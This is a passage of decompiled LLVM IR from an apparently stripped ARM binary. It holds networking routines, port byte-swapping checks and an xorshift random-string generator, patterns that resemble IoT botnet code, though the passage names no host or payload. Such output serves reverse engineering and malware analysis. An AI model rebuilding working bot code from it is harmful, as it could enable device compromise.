dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd54
  %v6_dd7c = inttoptr i32 %v3_dcb8 to i8*
  store i8* %v6_dd7c, i8** %stack_var_-42, align 4
  store i32 %v2_de54, i32* @sl, align 4
  %v0_dd80 = call i32 @function_11200()
  %v0_dd84 = load i32, i32* @r4, align 4
  %v2_dd84 = inttoptr i32 %v0_dd80 to i32*
  store i32 %v0_dd84, i32* %v2_dd84, align 4
  store i32 %v0_dd80, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_dd94 = load i32, i32* @r8, align 4
  %v1_dd94 = inttoptr i32 %v0_dd94 to i32*
  %v2_dd94 = load i32, i32* %v1_dd94, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dda0 = call i32 @function_114b4(i32 %v2_dd94, i32 %v2_de54, i32 2, i32 16386)
  %v7_dda4 = icmp eq i32 %v4_dda0, -1
  br i1 %v7_dda4, label %dec_label_pc_df80, label %dec_label_pc_ddac

dec_label_pc_ddac:                                ; preds = %dec_label_pc_dd78
  %v2_ddac = icmp eq i32 %v4_dda0, 0
  br i1 %v2_ddac, label %dec_label_pc_df90, label %dec_label_pc_ddb4

dec_label_pc_ddb4:                                ; preds = %dec_label_pc_ddac
  store i32 %v2_dc70, i32* %ip.global-to-local, align 4
  %v3_ddb8 = load i8*, i8** %stack_var_-42, align 4
  %v4_ddb8 = ptrtoint i8* %v3_ddb8 to i32
  store i32 %v4_ddb8, i32* %r3.global-to-local, align 4
  %v2_ddbc = icmp eq i8* %v3_ddb8, null
  br i1 %v2_ddbc, label %dec_label_pc_ddc4, label %dec_label_pc_dfc0

dec_label_pc_ddc4:                                ; preds = %dec_label_pc_ddb4
  %v0_ddc4 = load i32, i32* @r8, align 4
  %v1_ddc4 = inttoptr i32 %v0_ddc4 to i32*
  %v2_ddc4 = load i32, i32* %v1_ddc4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_ddd0 = add i32 %v4_ddb8, 16384
  store i32 %v1_ddd0, i32* %r3.global-to-local, align 4
  %v4_ddd4 = call i32 @function_114b4(i32 %v2_ddc4, i32 %v2_de54, i32 2, i32 %v1_ddd0)
  br label %dec_label_pc_db44

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dbb4
  %v0_dde4 = load i32, i32* @r4, align 4
  store i32 %v0_dde4, i32* %r2.global-to-local, align 4
  %v3_dde8 = call i32 @function_115e4(i32 2, i32 1, i32 %v0_dde4)
  %v7_ddec = icmp eq i32 %v3_dde8, -1
  store i32 %v3_dde8, i32* @r5, align 4
  %v1_ddf4 = load i32, i32* %r8.global-to-local, align 4
  %v2_ddf4 = inttoptr i32 %v1_ddf4 to i32*
  store i32 %v3_dde8, i32* %v2_ddf4, align 4
  br i1 %v7_ddec, label %dec_label_pc_dbc4, label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_dddc
  %v0_ddfc = load i32, i32* @r4, align 4
  store i32 %v0_ddfc, i32* %r2.global-to-local, align 4
  %v2_de04 = call i32 @function_10c0c(i32 %v3_dde8, i32 3)
  %v1_de0c = or i32 %v2_de04, 2048
  store i32 %v1_de0c, i32* %r2.global-to-local, align 4
  %v0_de10 = load i32, i32* @r5, align 4
  %v2_de14 = call i32 @function_10c0c(i32 %v0_de10, i32 4)
  %v2_de1c = load i32, i32* inttoptr (i32 124928 to i32*), align 2048
  store i32 %v2_de1c, i32* %r3.global-to-local, align 4
  %v2_de20 = icmp eq i32 %v2_de1c, 0
  br i1 %v2_de20, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_ddfc
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_ddfc, %bb41
  %v2_de28 = xor i1 %v2_de20, true
  call void @__pseudo_cond_branch(i1 %v2_de28, i32 %v2_de1c)
  store i32 ptrtoint (i8** @global_var_1e9d0.93 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_de34 = load i32, i32* %r8.global-to-local, align 4
  %v1_de34 = inttoptr i32 %v0_de34 to i32*
  %v2_de34 = load i32, i32* %v1_de34, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1e9d0.93 to i8*), align 4
  %v4_de44 = call i32 @function_113cc(i32 %v2_de34, i32 ptrtoint (i16** @global_var_20a58.77 to i32), i32 16)
  br label %dec_label_pc_dbc4

dec_label_pc_de4c:                                ; preds = %dec_label_pc_dc4c
  %v0_de50 = load i32, i32* @fp, align 4
  %v1_de50 = inttoptr i32 %v0_de50 to i32*
  %v2_de50 = load i32, i32* %v1_de50, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_de60 = call i32 @function_11528(i32 %v2_de50, i32 %v2_de54, i32 2, i32 16384)
  br label %dec_label_pc_dc80

dec_label_pc_de68:                                ; preds = %dec_label_pc_dcc4
  store i32 4, i32* @r4, align 4
  store i32 %v2_de70, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_de4c, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_de8c = call i32 @function_1143c(i32 %v2_dd44, i32 1, i32 4, i32 %v2_de70, i32 %v2_de4c)
  %v3_de90 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_de90, i32* %r3.global-to-local, align 4
  %v2_de94 = icmp eq i32 %v3_de90, 0
  br i1 %v2_de94, label %dec_label_pc_df1c, label %dec_label_pc_de9c

dec_label_pc_de9c:                                ; preds = %dec_label_pc_de68
  %v0_de9c = load i32, i32* @r5, align 4
  %v1_de9c = inttoptr i32 %v0_de9c to i32*
  %v2_de9c = load i32, i32* %v1_de9c, align 4
  %v1_dea0 = call i32 @function_10dd8(i32 %v2_de9c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dea8 = load i32, i32* @r5, align 4
  %v2_dea8 = inttoptr i32 %v1_dea8 to i32*
  store i32 -1, i32* %v2_dea8, align 4
  %v0_deac = call i32 @function_e0b4()
  %v3_deb4 = zext i32 %v0_deac to i64
  %v4_deb4 = mul nuw i64 %v3_deb4, 3435973837
  %v7_deb4 = trunc i64 %v4_deb4 to i32
  store i32 %v7_deb4, i32* %ip.global-to-local, align 4
  %v3_deb81 = udiv i64 %v4_deb4, 34359738368
  %v3_debc3 = mul nuw nsw i64 %v3_deb81, 8
  %v3_debc = trunc i64 %v3_debc3 to i32
  store i32 %v3_debc, i32* %r2.global-to-local, align 4
  %v2_dec05 = mul nuw nsw i64 %v3_deb81, 2
  %v2_dec0 = trunc i64 %v2_dec05 to i32
  %v2_dec4 = add i32 %v3_debc, %v2_dec0
  store i32 %v2_dec4, i32* %r3.global-to-local, align 4
  %v2_dec8 = sub i32 %v0_deac, %v2_dec4
  %v1_decc = add i32 %v2_dec8, 1
  %v1_ded0 = call i32 @function_12ef0(i32 %v1_decc)
  br label %dec_label_pc_db44

dec_label_pc_ded8:                                ; preds = %dec_label_pc_dc90
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_de70, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_deec = call i32 @function_1135c(i32 %v2_dc84, i32 %v2_dee4, i32 %v2_de70, i32 16, i32 16)
  %v1_def0 = call i32 @function_c93c(i32 %v5_deec)
  store i32 %v1_db04, i32* @lr, align 4
  %v2_df00 = call i32 @function_10ba4(i32 %v1_defc, i32 9)
  store i32 ptrtoint (i32* @global_var_1e9cc.81 to i32), i32* %r3.global-to-local, align 4
  %v2_df08 = load i32, i32* @global_var_1e9cc.81, align 4
  %v2_df0c = icmp eq i32 %v2_df08, 0
  br i1 %v2_df0c, label %dec_label_pc_df14, label %dec_label_pc_dfb4

dec_label_pc_df14:                                ; preds = %dec_label_pc_ded8, %dec_label_pc_dfb4
  %v1_df18 = call i32 @function_12e38(i32 0)
  br label %dec_label_pc_df1c

dec_label_pc_df1c:                                ; preds = %dec_label_pc_de68, %dec_label_pc_df14
  %v2_df20 = call i32 @function_10318(i8* %v1_df20)
  %sext = mul i32 %v2_df20, 16777216
  %v1_df24 = sdiv i32 %sext, 16777216
  %v7_df24 = inttoptr i32 %v1_df24 to i8*
  store i8* %v7_df24, i8** %stack_var_-42, align 4
  %v0_df28 = call i32 @function_105d4()
  %v0_df30 = load i32, i32* @r4, align 4
  store i32 %v0_df30, i32* %r2.global-to-local, align 4
  store i32 %v0_df28, i32* @global_var_20a4c.46, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_df40 = load i32, i32* @r5, align 4
  %v1_df40 = inttoptr i32 %v0_df40 to i32*
  %v2_df40 = load i32, i32* %v1_df40, align 4
  %v4_df44 = call i32 @function_11528(i32 %v2_df40, i32 ptrtoint (i32* @global_var_16184.99 to i32), i32 %v0_df30, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_df50 = load i32, i32* @r5, align 4
  %v1_df50 = inttoptr i32 %v0_df50 to i32*
  %v2_df50 = load i32, i32* %v1_df50, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_df5c = call i32 @function_11528(i32 %v2_df50, i32 %v2_de54, i32 1, i32 16384)
  %v3_df60 = load i8*, i8** %stack_var_-42, align 4
  %v4_df60 = ptrtoint i8* %v3_df60 to i32
  store i32 %v4_df60, i32* %r2.global-to-local, align 4
  %v3_df64 = icmp eq i8* %v3_df60, null
  br i1 %v3_df64, label %dec_label_pc_db44, label %dec_label_pc_df6c

dec_label_pc_df6c:                                ; preds = %dec_label_pc_df1c
  %v0_df6c = load i32, i32* @r5, align 4
  %v1_df6c = inttoptr i32 %v0_df6c to i32*
  %v2_df6c = load i32, i32* %v1_df6c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_df78 = call i32 @function_11528(i32 %v2_df6c, i32 %v2_d980, i32 %v4_df60, i32 16384)
  br label %dec_label_pc_db44

dec_label_pc_df80:                                ; preds = %dec_label_pc_dff0, %dec_label_pc_dd78
  %v0_df80 = load i32, i32* @r5, align 4
  %v1_df80 = inttoptr i32 %v0_df80 to i32*
  %v2_df80 = load i32, i32* %v1_df80, align 4
  store i32 %v2_df80, i32* %r3.global-to-local, align 4
  %v7_df84 = icmp eq i32 %v2_df80, 4
  br i1 %v7_df84, label %dec_label_pc_db44, label %bb43

bb43:                                             ; preds = %dec_label_pc_df80
  %v8_df88 = icmp eq i32 %v2_df80, 11
  br i1 %v8_df88, label %dec_label_pc_db44, label %dec_label_pc_df90

dec_label_pc_df90:                                ; preds = %dec_label_pc_e014, %bb43, %dec_label_pc_ddac
  %v0_df90 = load i32, i32* @fp, align 4
  %v1_df90 = inttoptr i32 %v0_df90 to i32*
  %v2_df90 = load i32, i32* %v1_df90, align 4
  store i32 57244, i32* @lr, align 4
  %v1_df98 = icmp ne i32 %v2_df90, -1
  call void @__pseudo_cond_branch(i1 %v1_df98, i32 ptrtoint (i32* @global_var_10dd8.95 to i32))
  store i32 124924, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* inttoptr (i32 124924 to i32*), align 4
  %v1_dfac = call i32 @function_12ef0(i32 1)
  br label %dec_label_pc_db44

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_ded8
  %v2_dfb8 = call i32 @function_10ba4(i32 %v2_df08, i32 9)
  br label %dec_label_pc_df14

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_ddb4
  %v3_dfc0 = udiv i32 %v4_ddb8, 256
  %v1_dfc4 = urem i32 %v4_ddb8, 256
  store i32 %v1_dfc4, i32* %r3.global-to-local, align 4
  %v4_dfc8 = mul nuw nsw i32 %v1_dfc4, 256
  %v5_dfc8 = or i32 %v4_dfc8, %v3_dfc0
  %v6_dfc8 = trunc i32 %v5_dfc8 to i16
  store i32 %v5_dfc8, i32* %r2.global-to-local, align 4
  %v7_dfd4 = inttoptr i32 %v5_dfc8 to i8*
  store i8* %v7_dfd4, i8** %stack_var_-42, align 4
  %tmp44 = icmp ult i16 %v6_dfc8, 1025
  br i1 %tmp44, label %dec_label_pc_dff0, label %dec_label_pc_dfdc

dec_label_pc_dfdc:                                ; preds = %dec_label_pc_dfc0
  %v0_dfdc = load i32, i32* @r8, align 4
  %v1_dfdc = inttoptr i32 %v0_dfdc to i32*
  %v2_dfdc = load i32, i32* %v1_dfdc, align 4
  %v1_dfe0 = call i32 @function_10dd8(i32 %v2_dfdc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfe8 = load i32, i32* @r8, align 4
  %v2_dfe8 = inttoptr i32 %v1_dfe8 to i32*
  store i32 -1, i32* %v2_dfe8, align 4
  br label %dec_label_pc_db44

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfc0
  %v0_dff0 = load i32, i32* @r4, align 4
  %v1_dff0 = load i32, i32* @r5, align 4
  %v2_dff0 = inttoptr i32 %v1_dff0 to i32*
  store i32 %v0_dff0, i32* %v2_dff0, align 4
  store i32 %v2_dff8, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_e000 = load i32, i32* @r8, align 4
  %v1_e000 = inttoptr i32 %v0_e000 to i32*
  %v2_e000 = load i32, i32* %v1_e000, align 4
  %v7_e008 = call i32 @function_114b4(i32 %v2_e000, i32 %v2_dff8, i32 %v5_dfc8, i32 16386)
  %v7_e00c = icmp eq i32 %v7_e008, -1
  br i1 %v7_e00c, label %dec_label_pc_df80, label %dec_label_pc_e014

dec_label_pc_e014:                                ; preds = %dec_label_pc_dff0
  %v2_e014 = icmp eq i32 %v7_e008, 0
  br i1 %v2_e014, label %dec_label_pc_df90, label %dec_label_pc_e01c

dec_label_pc_e01c:                                ; preds = %dec_label_pc_e014
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e028 = load i32, i32* @r8, align 4
  %v1_e028 = inttoptr i32 %v0_e028 to i32*
  %v2_e028 = load i32, i32* %v1_e028, align 4
  %v4_e02c = call i32 @function_114b4(i32 %v2_e028, i32 %v2_de54, i32 2, i32 16384)
  %v3_e034 = load i8*, i8** %stack_var_-42, align 4
  %v4_e034 = ptrtoint i8* %v3_e034 to i32
  %v3_e038 = udiv i32 %v4_e034, 256
  %v1_e03c = urem i32 %v4_e034, 256
  store i32 %v1_e03c, i32* %r3.global-to-local, align 4
  %v4_e040 = mul nuw nsw i32 %v1_e03c, 256
  %v5_e040 = or i32 %v4_e040, %v3_e038
  store i32 %v5_e040, i32* %ip.global-to-local, align 4
  store i32 %v2_dc70, i32* @lr, align 4
  store i32 %v5_e040, i32* %r2.global-to-local, align 4
  %v0_e050 = load i32, i32* @r8, align 4
  %v1_e050 = inttoptr i32 %v0_e050 to i32*
  %v2_e050 = load i32, i32* %v1_e050, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e058 = inttoptr i32 %v5_e040 to i8*
  store i8* %v6_e058, i8** %stack_var_-42, align 4
  %v6_e05c = call i32 @function_114b4(i32 %v2_e050, i32 %v2_dff8, i32 %v5_e040, i32 16384)
  store i32 %v2_dc70, i32* %r2.global-to-local, align 4
  %v3_e064 = load i8*, i8** %stack_var_-42, align 4
  %v3_e068 = icmp eq i8* %v3_e064, null
  br i1 %v3_e068, label %dec_label_pc_db44, label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %dec_label_pc_e01c
  %v4_e064 = ptrtoint i8* %v3_e064 to i32
  %v5_e074 = call i32 @function_82e8(i32* nonnull %stack_var_-1432, i32 %v4_e064, i32 %v2_dc70)
  br label %dec_label_pc_db44

; uselistorder directives
  uselistorder i8* %v3_e064, { 1, 0 }
  uselistorder i32 %v5_e040, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e034, { 1, 0 }
  uselistorder i32 %v7_e008, { 1, 0 }
  uselistorder i32 %v5_dfc8, { 1, 0, 3, 2 }
  uselistorder i32 %v3_dde8, { 3, 2, 1, 0 }
  uselistorder i32 %v4_ddb8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dda0, { 1, 0 }
  uselistorder i32 %v2_dd44, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_dc84, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_dc6c, { 1, 0, 2 }
  uselistorder i32 %v5_dc38, { 1, 2, 0 }
  uselistorder i32 %v2_db84, { 2, 1, 0 }
  uselistorder i32 %v1_db74, { 1, 2, 0 }
  uselistorder i32 %v1_db58, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_de70, { 1, 0, 2, 3 }
  uselistorder i32 %v2_de54, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_de4c, { 1, 0 }
  uselistorder i32 %v2_dc70, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_db40, { 1, 0, 2 }
  uselistorder i32 %v2_d9e4, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_d9d0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d8fc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 31, 30, 34, 32, 33, 25, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_1e9cc.81, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @function_12ef0, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e9d0.93 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e9d0.93 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* inttoptr (i32 124920 to i32*), { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32)* @function_d7fc, { 1, 0 }
  uselistorder i32 (i32)* @function_cef8, { 1, 0 }
  uselistorder i32 (i32)* @function_85e0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_e178, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_d654, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_d7b4.69 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_20a58.77 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_11690, { 1, 0 }
  uselistorder label %dec_label_pc_df1c, { 1, 0 }
  uselistorder label %dec_label_pc_df14, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_dc80, { 2, 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_dbc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbb4, { 1, 0 }
  uselistorder label %dec_label_pc_db44, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d9a4, { 2, 0, 1 }
}

define i32 @function_e098(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_e098:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_e098 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e098, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e098
  %v1_e098 = load i32, i32* @lr, align 4
  %v3_e098 = bitcast i64* %arg2 to i32*
  store i32 %v1_e098, i32* %v3_e098, align 4
  %v4_e098 = load i32, i32* @ip, align 4
  %v5_e098 = load i32, i32* %r1.global-to-local, align 4
  %v6_e098 = sub i32 %v5_e098, %v4_e098
  store i32 %v6_e098, i32* %r1.global-to-local, align 4
  %v1_e09c = load i32, i32* @lr, align 4
  %v3_e09c = inttoptr i32 %v6_e098 to i32*
  store i32 %v1_e09c, i32* %v3_e09c, align 4
  %v4_e09c = load i32, i32* @r8, align 4
  %v5_e09c = load i32, i32* %r1.global-to-local, align 4
  %v6_e09c = sub i32 %v5_e09c, %v4_e09c
  store i32 %v6_e09c, i32* %r1.global-to-local, align 4
  %v2_e0a0 = inttoptr i32 %v6_e09c to i64*
  %v3_e0a0 = load i64, i64* %v2_e0a0, align 4
  %v5_e0a0 = trunc i64 %v3_e0a0 to i32
  call void @__pseudo_branch(i32 %v5_e0a0)
  %v9_e0a0 = sub i32 %v6_e09c, %arg1
  store i32 %v9_e0a0, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e098, %bb
  %v0_e0a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v0_e0a4, i32 -22312104)
  %v0_e0ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0ac, label %bb3, label %.thread2

bb3:                                              ; preds = %.thread1
  %v2_e0b0 = load i32, i32* @r4, align 4
  %v3_e0b0 = and i32 %v2_e0b0, 536870912
  %v4_e0b0 = icmp ne i32 %v3_e0b0, 0
  store i1 %v4_e0b0, i1* %cpsr_c.global-to-local, align 1
  br label %.thread2

.thread2:                                         ; preds = %.thread1, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_e0b4() local_unnamed_addr {
dec_label_pc_e0b4:
  %v2_e0c0 = load i32, i32* @global_var_1e9d4.101, align 4
  %v2_e0c4 = load i32, i32* @global_var_1e9e0.103, align 4
  %v4_e0d0 = mul i32 %v2_e0c0, 2048
  %v5_e0d0 = xor i32 %v4_e0d0, %v2_e0c0
  store i32 %v5_e0d0, i32* @r3, align 4
  %v4_e0d4 = udiv i32 %v2_e0c4, 524288
  %v5_e0d4 = xor i32 %v4_e0d4, %v2_e0c4
  %v2_e0d8 = load i32, i32* @global_var_1e9d8.105, align 4
  %v2_e0dc = load i32, i32* @global_var_1e9dc.107, align 4
  store i32 %v2_e0dc, i32* @ip, align 4
  %v2_e0e0 = xor i32 %v5_e0d4, %v5_e0d0
  %v4_e0e4 = udiv i32 %v5_e0d0, 256
  %v5_e0e4 = xor i32 %v2_e0e0, %v4_e0e4
  store i32 %v2_e0d8, i32* @global_var_1e9d4.101, align 4
  store i32 %v2_e0dc, i32* @global_var_1e9d8.105, align 4
  store i32 %v2_e0c4, i32* @global_var_1e9dc.107, align 4
  store i32 %v5_e0e4, i32* @global_var_1e9e0.103, align 4
  ret i32 %v5_e0e4

; uselistorder directives
  uselistorder i32 %v2_e0c4, { 2, 1, 0 }
  uselistorder i32 %v2_e0c0, { 1, 0 }
}

define i32 @function_e110(i32 %arg1) local_unnamed_addr {
dec_label_pc_e110:
  %v2_e11c = call i32 @function_10a58(i32* null)
  store i32 %v2_e11c, i32* @r0, align 4
  store i32 %v2_e11c, i32* @global_var_1e9d4.101, align 4
  %v0_e128 = call i32 @function_10a44()
  store i32 %v0_e128, i32* @r0, align 4
  %v0_e130 = call i32 @function_1099c()
  %v2_e138 = xor i32 %v0_e128, %v0_e130
  store i32 %v2_e138, i32* @global_var_1e9d8.105, align 4
  %v1_e140 = call i32 @function_1121c(i32 %v2_e138)
  %v2_e144 = load i32, i32* @global_var_1e9d8.105, align 4
  %v2_e150 = xor i32 %v2_e144, %v1_e140
  store i32 %v2_e150, i32* @global_var_1e9e0.103, align 4
  store i32 %v1_e140, i32* @global_var_1e9dc.107, align 4
  ret i32 %v1_e140

; uselistorder directives
  uselistorder i32 %v1_e140, { 1, 2, 0 }
  uselistorder i32 ()* @function_1099c, { 2, 1, 0 }
}

define i32 @function_e178(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e178:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e178 = load i32, i32* @r4, align 4
  %v6_e178 = load i32, i32* @r5, align 4
  %v9_e178 = load i32, i32* @r6, align 4
  %v12_e178 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e18c = call i32 @function_fd60(i32 31)
  %v3_e198 = call i32 @function_fc9c(i32 31, i32* null)
  store i32 %v3_e198, i32* @r1, align 4
  %v2_e1a4 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1a4 = call i32 @function_11310(i8* %v2_e1a4, i32 %v3_e198)
  %v2_e1a8 = icmp eq i32 %arg2, 0
  br i1 %v2_e1a8, label %dec_label_pc_e224, label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e178
  store i32 ptrtoint (i32* @global_var_1e9d4.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9d8.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9dc.107 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1e9e0.103 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e208 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1c4.dec_label_pc_e1c4_crit_edge, %dec_label_pc_e1b0
  %v1_e1e8 = phi i32 [ %v1_e1e8.pre, %dec_label_pc_e1c4.dec_label_pc_e1c4_crit_edge ], [ ptrtoint (i32* @global_var_1e9d4.101 to i32), %dec_label_pc_e1b0 ]
  %v2_e1c4 = load i32, i32* @global_var_1e9e0.103, align 4
  store i32 %v2_e1c4, i32* %r2.global-to-local, align 4
  %v2_e1c8 = load i32, i32* @global_var_1e9d4.101, align 4
  %v4_e1cc = udiv i32 %v2_e1c4, 524288
  %v5_e1cc = xor i32 %v4_e1cc, %v2_e1c4
  %v4_e1d0 = mul i32 %v2_e1c8, 2048
  %v5_e1d0 = xor i32 %v4_e1d0, %v2_e1c8
  %v2_e1d4 = xor i32 %v5_e1cc, %v5_e1d0
  %v2_e1d8 = load i32, i32* @global_var_1e9d8.105, align 4
  %v2_e1dc = load i32, i32* @global_var_1e9dc.107, align 4
  store i32 %v2_e1dc, i32* @ip, align 4
  %v4_e1e0 = udiv i32 %v5_e1d0, 256
  %v5_e1e0 = xor i32 %v2_e1d4, %v4_e1e0
  store i32 %v5_e1e0, i32* @r4, align 4
  %v2_e1e8 = inttoptr i32 %v1_e1e8 to i32*
  store i32 %v2_e1d8, i32* %v2_e1e8, align 4
  %v0_e1ec = load i32, i32* @ip, align 4
  %v1_e1ec = load i32, i32* %r8.global-to-local, align 4
  %v2_e1ec = inttoptr i32 %v1_e1ec to i32*
  store i32 %v0_e1ec, i32* %v2_e1ec, align 4
  %v0_e1f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1f0 = load i32, i32* @r7, align 4
  %v2_e1f0 = inttoptr i32 %v1_e1f0 to i32*
  store i32 %v0_e1f0, i32* %v2_e1f0, align 4
  %v0_e1f4 = load i32, i32* @r4, align 4
  %v1_e1f4 = load i32, i32* @r6, align 4
  %v2_e1f4 = inttoptr i32 %v1_e1f4 to i32*
  store i32 %v0_e1f4, i32* %v2_e1f4, align 4
  %v2_e1f8 = call i32 @function_10318(i8* %v2_e1a4)
  %v0_e200 = load i32, i32* @r4, align 4
  %v2_e204 = call i32 @function_10970(i32 %v0_e200, i32 %v2_e1f8)
  %v2_e20c = add i32 %v2_e1f8, %v2_e208
  %v1_e210 = add i32 %v2_e20c, -32
  %v2_e210 = inttoptr i32 %v1_e210 to i8*
  %v3_e210 = load i8, i8* %v2_e210, align 1
  %v2_e214 = load i32, i32* @r5, align 4
  %v3_e214 = load i32, i32* %fp.global-to-local, align 4
  %v4_e214 = add i32 %v3_e214, %v2_e214
  %v5_e214 = inttoptr i32 %v4_e214 to i8*
  store i8 %v3_e210, i8* %v5_e214, align 1
  %v0_e218 = load i32, i32* @r5, align 4
  %v1_e218 = add i32 %v0_e218, 1
  store i32 %v1_e218, i32* @r5, align 4
  %v1_e21c = load i32, i32* %sb.global-to-local, align 4
  %v9_e21c = icmp eq i32 %v1_e218, %v1_e21c
  br i1 %v9_e21c, label %dec_label_pc_e224, label %dec_label_pc_e1c4.dec_label_pc_e1c4_crit_edge

dec_label_pc_e1c4.dec_label_pc_e1c4_crit_edge:    ; preds = %dec_label_pc_e1c4
  %v1_e1e8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1c4

dec_label_pc_e224:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e178
